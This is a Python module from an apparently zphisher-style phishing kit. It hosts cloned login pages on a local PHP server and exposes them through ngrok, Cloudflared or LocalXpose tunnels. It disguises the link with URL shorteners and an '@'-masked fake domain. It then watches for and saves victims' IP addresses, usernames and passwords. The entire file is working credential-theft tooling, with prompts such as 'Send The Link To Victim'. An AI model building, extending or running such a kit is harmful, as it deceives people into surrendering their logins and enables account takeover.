import platform
import os
import time
import requests
import subprocess
import sys
import re
import shutil
from colorama import Fore, Back, init
from modules.config import HOST, PORT
from modules.banner import AsciiArt
from modules.check import system
from modules.settings import Read_Setting, Write_Setting
init()


class Control:
    @staticmethod
    def clear_screen():
        """Clearing The Screen Cross-Platform"""
        if platform.system().lower() == "windows":
            os.system('cls')
        else:
            os.system("clear")

    @staticmethod
    def msg_exit():
        print(f"{Back.GREEN}{Fore.LIGHTRED_EX} Thank you for using this tool. Have a good day.\n{Back.RESET}{Fore.RESET}")
        sys.exit(0)

    @staticmethod
    def check_status():
        print(f"{Fore.LIGHTBLUE_EX}[{Fore.LIGHTGREEN_EX}+{Fore.LIGHTBLUE_EX}]{Fore.LIGHTCYAN_EX} Internet Status : ", end="")
        
        try:
            response = requests.get('https://api.github.com', timeout=3)
            # subprocess.run(["timeout", "3s", "curl", "-fIs", "https://api.github.com"], stdout=subprocess.DEVNULL)
            if response.status_code == 200:
                print(f'{Fore.LIGHTGREEN_EX}Online')
            
        except:
            print(f'{Fore.LIGHTRED_EX}Offline')

    @staticmethod
    def custom_mask():
        time.sleep(0.5)
        mask_op = input(f"{Fore.LIGHTBLUE_EX}[{Fore.YELLOW}?{Fore.LIGHTBLUE_EX}]{Fore.LIGHTYELLOW_EX} Do you want to change Mask URL? {Fore.LIGHTBLUE_EX}[{Fore.LIGHTCYAN_EX}y{Fore.LIGHTBLUE_EX}/{Fore.LIGHTCYAN_EX}N{Fore.LIGHTBLUE_EX}] :> ")
        print()
        if mask_op.lower() == "y":
            print(f"\nEnter your custom URL below {Fore.LIGHTBLUE_EX}({Fore.YELLOW}Example: https://get-free-followers.com{Fore.LIGHTBLUE_EX})\n")
            mask_url = input(f"{Fore.LIGHTWHITE_EX} ==> {Fore.YELLOW}") or "https://"
            if mask_url.startswith(("http", "https")) or mask_url[:3] == "www" and all(c not in ",~!@%:=#;^*\"'|?+<>(){}\\/ " for c in mask_url):
                Write_Setting('mask', mask_url)
                print(f"\n{Fore.LIGHTBLUE_EX}[{Fore.LIGHTGREEN_EX}+{Fore.LIGHTBLUE_EX}]{Fore.LIGHTCYAN_EX} Using custom Masked Url :{Fore.LIGHTGREEN_EX} {Read_Setting('mask')}")
            else:
                print(f"\n{Fore.LIGHTBLUE_EX}[{Fore.YELLOW}!{Fore.LIGHTBLUE_EX}]{Fore.YELLOW} Invalid url type..Using the Default one..")
    

    @staticmethod
    def kill_processes():
        sys = system()
        if sys == "windows":
            check = ['php.exe', 'ngrok.exe', 'cloudflared.exe', 'localx.exe']
        else:
            check = ['php', 'ngrok', 'cloudflared', 'localx']
        for process in check:
            if sys == "windows":
                subprocess.getoutput(f"taskkill /f /im {process}")
            elif sys == "linux" or sys == "darwin":
                subprocess.getoutput(f"pkill -f {process}")
            else:
                subprocess.getoutput(f"killall {process}")

    @staticmethod
    def site_stat(url):
        if url != "":
            return requests.get(url + "https://github.com").status_code
    
    @staticmethod
    def shorten(url, endpoint):
        # global PROCCESSED_URL
        short = requests.get(url + endpoint, verify=False, allow_redirects=True, timeout=(2, 2))
        if "shrtco.de" in url:
            Write_Setting('processed_url', re.search('"short_link2":"[a-zA-Z0-9./-]*', short.text).group(0).split('"')[3])
        else:
            Write_Setting('processed_url', short.text.split("http")[-1].split("//")[-1])

    @staticmethod
    def custom_url(url):
        # global WEBSITE_NAME, MASK_OF_WEBSITE, PROCCESSED_URL
        isgd="https://is.gd/create.php?format=simple&url="
        shortcode = "https://api.shrtco.de/v2/shorten?url="
        tinyurl = "https://tinyurl.com/api-create.php?url="


        if "trycloudflare.com" in url or "loclx.io" in url:
            if Control.site_stat(shortcode) == 2:
                Control.shorten(shortcode, url)
            else:
                Control.shorten(tinyurl, url)

            url = "https://" + url
            masked_url = Read_Setting('mask') + "@" + Read_Setting('processed_url')
            Write_Setting('processed_url', "https://" + Read_Setting('processed_url'))
        else:
            # print("[!] No url provided / Regex Not Matched")
            url = "Unable to generate links. Try after turning on hotspot"
            Write_Setting('processed_url', "Unable to Short URL")

        print(f"\n{Fore.LIGHTBLUE_EX}[{Fore.LIGHTGREEN_EX}+{Fore.LIGHTBLUE_EX}]{Fore.LIGHTCYAN_EX} URL 1 : {Fore.LIGHTGREEN_EX}{url}")
        print(f"\n{Fore.LIGHTBLUE_EX}[{Fore.LIGHTGREEN_EX}+{Fore.LIGHTBLUE_EX}]{Fore.LIGHTCYAN_EX} URL 2 : {Fore.YELLOW}{Read_Setting('processed_url')}")
        if "Unable" not in Read_Setting('processed_url'):
            print(f"\n{Fore.LIGHTBLUE_EX}[{Fore.LIGHTGREEN_EX}+{Fore.LIGHTBLUE_EX}]{Fore.LIGHTCYAN_EX} URL 3 : {Fore.YELLOW}{masked_url}")
            
    
    @staticmethod
    def customport():
        global PORT
        print()
        P_ANS = input(f"{Fore.LIGHTBLUE_EX}[{Fore.YELLOW}?{Fore.LIGHTBLUE_EX}]{Fore.YELLOW} Do You Want A Custom Port {Fore.LIGHTGREEN_EX}[{Fore.LIGHTCYAN_EX}y{Fore.LIGHTGREEN_EX}/{Fore.LIGHTCYAN_EX}N{Fore.LIGHTGREEN_EX}]: {Fore.YELLOW}")
        if P_ANS.upper() == 'Y':
            print("\n")
            CU_P = input(f"{Fore.LIGHTBLUE_EX}[{Fore.RED}-{Fore.LIGHTBLUE_EX}]{Fore.YELLOW} Enter Your Custom 4-digit Port [1024-9999] : {Fore.WHITE}")
            if CU_P and CU_P.isdigit() and 1024 <= int(CU_P) <= 9999:
                PORT = int(CU_P)
                print()
            else:
                print(f"\n\n{Fore.LIGHTBLUE_EX}[{Fore.YELLOW}!{Fore.LIGHTBLUE_EX}]{Fore.LIGHTRED_EX} Invalid 4-digit Port : {CU_P}, Try Again...{Fore.RESET}")
                time.sleep(2)
                # Control.clear_screen()
                Control.customport()
        else:
            print(f"\n\n{Fore.LIGHTBLUE_EX}[{Fore.RED}-{Fore.LIGHTBLUE_EX}]{Fore.WHITE} Using Default Port {PORT}...{Fore.RESET}\n")

    @staticmethod
    def start_cloudflared():
        try:
            os.remove("./server/.cld.log")
        except:
            pass
        Control.customport()
        print(f"\n{Fore.LIGHTBLUE_EX}[{Fore.LIGHTGREEN_EX}+{Fore.LIGHTBLUE_EX}]{Fore.LIGHTGREEN_EX} Initializing... {Fore.LIGHTBLUE_EX}( {Fore.LIGHTCYAN_EX}http://{HOST}:{PORT} {Fore.LIGHTBLUE_EX})")
        time.sleep(1)
        Control.setup_site()
        print(f"\n\n{Fore.LIGHTBLUE_EX}[{Fore.LIGHTGREEN_EX}+{Fore.LIGHTBLUE_EX}]{Fore.LIGHTGREEN_EX} Launching Cloudflared...")
        os.chdir('../../')
        if shutil.which('termux-chroot'):
            time.sleep(2)
            with open('.server/cloudflared.log', 'w') as cloudflaredlog:
                subprocess.Popen(f"termux-chroot .server/cloudflared tunnel -url {HOST}:{PORT} --logfile .server/.cld.log", shell=True, stderr=cloudflaredlog, stdout=cloudflaredlog)
        elif system() == "windows":
            with open('.server/cloudflared.log', 'w') as cloudflaredlog:
                subprocess.Popen(rf'.server\cloudflared tunnel -url {HOST}:{PORT} --logfile .server/.cld.log', shell=True, stderr=cloudflaredlog, stdout=cloudflaredlog)
        else:
            time.sleep(2)
            with open('.server/cloudflared.log', 'w') as cloudflaredlog:
                subprocess.Popen(f"../../.server/cloudflared tunnel -url {HOST}:{PORT} --logfile .server/.cld.log", shell=True, stderr=cloudflaredlog, stdout=cloudflaredlog)

        time.sleep(8)
        with open(".server/.cld.log", "r") as file:
            cldflr_url = re.search(r'https://[-0-9a-z]*\.trycloudflare.com', file.read()).group()
        Control.custom_url(cldflr_url)
        Control.capture_data()

    @staticmethod
    def localxpose_auth():
        with open('.server/localxpose.log', 'w') as localxposelog:
            subprocess.Popen(".server/loclx -help", shell=True, stderr=localxposelog, stdout=localxposelog)
        time.sleep(1)
        auth_f = ".localxpose/.access" if os.path.isdir(".localxpose") else f"{os.path.expanduser('~')}/.localxpose/.access"

        if "Error" in subprocess.getoutput(".server/loclx account status"):
            print(f"\n\n{Fore.LIGHTBLUE_EX}[{Fore.YELLOW}!{Fore.LIGHTBLUE_EX}]{Fore.LIGHTGREEN_EX} Create an account on {Fore.YELLOW}localxpose.io{Fore.LIGHTGREEN_EX} & copy the token\n")
            time.sleep(3)
            loclx_token = input(f"{Fore.LIGHTBLUE_EX}[{Fore.LIGHTGREEN_EX}+{Fore.LIGHTBLUE_EX}]{Fore.LIGHTGREEN_EX} Input Loclx Token :> ")
            if not loclx_token:
                print(f"\n{Fore.LIGHTBLUE_EX}[{Fore.YELLOW}!{Fore.LIGHTBLUE_EX}]{Fore.LIGHTRED_EX} You have to input Localxpose Token.")
                time.sleep(2)
                Control.tunnel_menu()
            else:
                with open(auth_f, "w") as file:
                    file.write(loclx_token)

    @staticmethod
    def start_loclx():
        Control.customport()
        print(f"\n{Fore.LIGHTBLUE_EX}[{Fore.LIGHTGREEN_EX}+{Fore.LIGHTBLUE_EX}]{Fore.LIGHTGREEN_EX} Initializing... {Fore.LIGHTBLUE_EX}( {Fore.LIGHTCYAN_EX}http://{HOST}:{PORT} {Fore.LIGHTBLUE_EX})")
        time.sleep(1)
        Control.setup_site()
        os.chdir('../..')
        Control.localxpose_auth()
        
        print("\n")
        opinion = input(f"{Fore.LIGHTBLUE_EX}[{Fore.YELLOW}?{Fore.LIGHTBLUE_EX}]{Fore.YELLOW} Change Loclx Server Region? {Fore.LIGHTBLUE_EX}[{Fore.LIGHTCYAN_EX}y{Fore.LIGHTBLUE_EX}/{Fore.LIGHTCYAN_EX}N{Fore.LIGHTBLUE_EX}]:> {Fore.LIGHTGREEN_EX} ").lower()
        loclx_region = "eu" if opinion == "y" else "us"
        print(f"\n\n{Fore.LIGHTBLUE_EX}[{Fore.LIGHTGREEN_EX}+{Fore.LIGHTBLUE_EX}]{Fore.LIGHTGREEN_EX} Launching LocalXpose...")
        with open('.server/.localx', 'w') as localxpose_startlog:
            if shutil.which('termux-chroot'):
                time.sleep(1)
                subprocess.Popen(f"termux-chroot .server/localx tunnel --raw-mode http --region {loclx_region} --https-redirect -t {HOST}:{PORT}", shell=True, stderr=localxpose_startlog, stdout=localxpose_startlog)
            elif system() == "windows":
                time.sleep(1)
                subprocess.Popen(fr".server\localx.exe tunnel --raw-mode http --region {loclx_region} --https-redirect -t {HOST}:{PORT}", shell=True, stderr=localxpose_startlog, stdout=localxpose_startlog)
            else:
                time.sleep(1)
                subprocess.Popen(f".server/localx tunnel --raw-mode http --region {loclx_region} --https-redirect -t {HOST}:{PORT}", shell=True, stderr=localxpose_startlog, stdout=localxpose_startlog)

        time.sleep(12)
        with open(r".server/.localx", "r") as file:
            loclx_url = re.search(r'[0-9a-zA-Z.]*.loclx.io', file.read()).group()
        Control.custom_url(loclx_url)
        Control.capture_data()
    @staticmethod
    def ngrok_link():
        return str(requests.get("http://127.0.0.1:4040/api/tunnels").json()['tunnels'][0]['public_url'])
    @staticmethod
    def start_ngrok():
        Control.customport()
        print(f"\n{Fore.LIGHTBLUE_EX}[{Fore.LIGHTGREEN_EX}+{Fore.LIGHTBLUE_EX}]{Fore.LIGHTGREEN_EX} Initializing... {Fore.LIGHTBLUE_EX}( {Fore.LIGHTCYAN_EX}http://{HOST}:{PORT} {Fore.LIGHTBLUE_EX})")
        Control.setup_site()
        time.sleep(1)
        os.chdir('../..')
        print("\n")
        print(f"\n\n{Fore.LIGHTBLUE_EX}[{Fore.LIGHTGREEN_EX}+{Fore.LIGHTBLUE_EX}]{Fore.LIGHTGREEN_EX} Launching Ngrok...")

        with open('.server/ngrok.log', 'w') as ngroklog:
            if system() == "windows":
                subprocess.Popen(rf'.server\ngrok http {PORT}', shell=True, stderr=ngroklog, stdout=ngroklog)
            else:
                subprocess.Popen(rf".server/ngrok http {PORT}", shell=True, stderr=ngroklog, stdout=ngroklog)
        time.sleep(5)
        print(f"{Fore.LIGHTBLUE_EX}[{Fore.LIGHTGREEN_EX}+{Fore.LIGHTBLUE_EX}]{Fore.LIGHTGREEN_EX} Send The Link To Victim:{Fore.LIGHTCYAN_EX} {Control.ngrok_link()}")
        Control.capture_data()

    @staticmethod
    def start_localhost():
        
        Control.customport()
        print(f"\n{Fore.LIGHTBLUE_EX}[{Fore.YELLOW}!{Fore.LIGHTBLUE_EX}]{Fore.LIGHTGREEN_EX} Initializing... {Fore.WHITE}( {Fore.LIGHTCYAN_EX}http://{HOST}:{PORT} {Fore.WHITE})")
        Control.setup_site()
        time.sleep(1)
        os.chdir('../..')
        # Control.clear_screen()
        # print(AsciiArt.Logo_v2)
        print(f"\n{Fore.LIGHTBLUE_EX}[{Fore.YELLOW}!{Fore.LIGHTBLUE_EX}]{Fore.LIGHTGREEN_EX} Successfully Hosted at : {Fore.WHITE}( {Fore.LIGHTCYAN_EX}http://{HOST}:{PORT} {Fore.WHITE})")
        Control.capture_data()
    # @staticmethod
    # def CopySite():
    #     # shutil.rmtree(f".sites/www/")
    #     shutil.copytree(f".sites/{Read_Setting('website')}", ".server/www", dirs_exist_ok=True)
    #     shutil.copy2(".sites/ip.php", ".server/www/")
    @staticmethod
    def setup_site():
        # Setting up server
        print(f"\n{Fore.LIGHTBLUE_EX}[{Fore.YELLOW}!{Fore.LIGHTBLUE_EX}] Setting up server...{Fore.WHITE}")
        # for i in range(3):
        # try:
        #     os.remove('.server/www/*')
        # except:
        #     pass
        # Control.CopySite()
        try:
            shutil.copytree(f".sites/{Read_Setting('website')}", ".server/www", dirs_exist_ok=True)
            shutil.copy2(".sites/ip.php", ".server/www/")
        except (FileExistsError, FileNotFoundError):
            pass

        # Starting PHP server
        print(f"\n{Fore.LIGHTBLUE_EX}[{Fore.YELLOW}!{Fore.LIGHTBLUE_EX}] Starting PHP server...{Fore.WHITE}")
        os.chdir(".server/www")
        with open('php.log', 'w') as phplog:
            subprocess.Popen(f"php -S {HOST}:{PORT}", shell='True', stdout=phplog, stderr=phplog)
        Control.clear_screen()
        print(AsciiArt.Logo_v2)

    @staticmethod
    def capture_ip():
        IP = open('ip.txt').read().split('IP: ')[1].strip()
        print(f"\n{Fore.LIGHTBLUE_EX}[{Fore.GREEN}+{Fore.LIGHTBLUE_EX}]{Fore.LIGHTGREEN_EX} Victim's IP : {Fore.LIGHTBLUE_EX}{IP}")
        print(f"\n{Fore.LIGHTBLUE_EX}[{Fore.YELLOW}!{Fore.LIGHTBLUE_EX}]{Fore.LIGHTBLUE_EX} Saved in : {Fore.LIGHTYELLOW_EX}auth/ip.txt")
        with open('auth/ip.txt', 'a') as f:
            f.write(open('.server/ip.txt').read())

    @staticmethod
    def capture_creds():
        with open('usernames.txt') as file:
            data = file.read()
            ACCOUNT = data.split('Username: ')[1].split('Pass: ')[0].strip('\n')
            PASSWORD = data.split('Pass: ')[1].strip()
        print(f"\n{Fore.LIGHTBLUE_EX}[{Fore.GREEN}+{Fore.LIGHTBLUE_EX}]{Fore.LIGHTGREEN_EX} Account : {Fore.LIGHTBLUE_EX}{ACCOUNT}")
        print(f"\n{Fore.LIGHTBLUE_EX}[{Fore.GREEN}+{Fore.LIGHTBLUE_EX}]{Fore.LIGHTGREEN_EX} Password : {Fore.LIGHTBLUE_EX}{PASSWORD}")
        print(f"\n{Fore.LIGHTBLUE_EX}[{Fore.YELLOW}!{Fore.LIGHTBLUE_EX}]{Fore.LIGHTBLUE_EX} Saved in : {Fore.LIGHTYELLOW_EX}auth/usernames.dat")
        with open('../../auth/usernames.dat', 'a') as f:
            f.write(data)
        print(f"\n{Fore.LIGHTBLUE_EX}[{Fore.YELLOW}!{Fore.LIGHTBLUE_EX}]{Fore.YELLOW} Waiting for Next Login Info, {Fore.LIGHTBLUE_EX}Ctrl + C {Fore.YELLOW}to exit...")


    @staticmethod
    def capture_data():
        print(f"\n{Fore.LIGHTBLUE_EX}[{Fore.YELLOW}!{Fore.LIGHTBLUE_EX}]{Fore.YELLOW} Waiting for Login Info, {Fore.LIGHTBLUE_EX}Ctrl + C {Fore.YELLOW}to exit...")
        while True:
            if os.path.exists(".server/ip.txt"):
                print(f"\n\n{Fore.LIGHTBLUE_EX}[{Fore.GREEN}+{Fore.LIGHTBLUE_EX}]{Fore.LIGHTGREEN_EX} Victim IP Found !")
                Control.capture_ip()
                os.remove(".server/ip.txt")
            time.sleep(0.75)
            if os.path.exists(".server/usernames.txt"):
                print(f"\n\n{Fore.LIGHTBLUE_EX}[{Fore.GREEN}+{Fore.LIGHTBLUE_EX}]{Fore.LIGHTGREEN_EX} Login info Found !!")
                Control.capture_creds()
                os.remove(".server/usernames.txt")
            time.sleep(0.75)


    @staticmethod
    def tunnel_menu(Website:str = None, Mask:str = None):
        # global WEBSITE_NAME, MASK_OF_WEBSITE
        if Website:
            if Mask:
                Write_Setting('website', Website)
                Write_Setting('mask', Mask)
        Control.clear_screen()
        print(AsciiArt.Logo_v2)
        print("\n")
        print(f"{Fore.LIGHTBLUE_EX}[{Fore.LIGHTWHITE_EX}01{Fore.LIGHTBLUE_EX}]{Fore.YELLOW} Localhost")
        print(f"{Fore.LIGHTBLUE_EX}[{Fore.LIGHTWHITE_EX}02{Fore.LIGHTBLUE_EX}]{Fore.YELLOW} Ngrok        {Fore.LIGHTBLUE_EX}[{Fore.LIGHTGREEN_EX}Recommended{Fore.LIGHTBLUE_EX}]")
        print(f"{Fore.LIGHTBLUE_EX}[{Fore.LIGHTWHITE_EX}03{Fore.LIGHTBLUE_EX}]{Fore.YELLOW} Cloudflared  {Fore.LIGHTBLUE_EX}[{Fore.LIGHTCYAN_EX}Auto Detects{Fore.LIGHTBLUE_EX}]")
        print(f"{Fore.LIGHTBLUE_EX}[{Fore.LIGHTWHITE_EX}04{Fore.LIGHTBLUE_EX}]{Fore.YELLOW} LocalXpose   {Fore.LIGHTBLUE_EX}[{Fore.LIGHTCYAN_EX}NEW! Max 15Min{Fore.LIGHTBLUE_EX}]\n")

        reply = input(f"{Fore.LIGHTGREEN_EX}Select a port forwarding service [01-04]:> ")

        if reply in ['1', '01']:
            Control.start_localhost()
        
        elif reply in ['2', '02']:
            Control.start_ngrok()
        elif reply in ['3', '03']:
            Control.start_cloudflared()
            # sys.exit(Fore.GREEN+'[+] Comming Soon !!')
        elif reply in ['4', '04']:
            # start_loclx
            Control.start_loclx()
            # sys.exit(Fore.GREEN+'[+] Comming Soon !!')
        else:
            print(f"\n{Fore.LIGHTBLUE_EX}[{Fore.YELLOW}!{Fore.LIGHTBLUE_EX}]{Fore.LIGHTRED_EX} Invalid Option, Try Again...")
            time.sleep(1)
            Control.tunnel_menu()
    
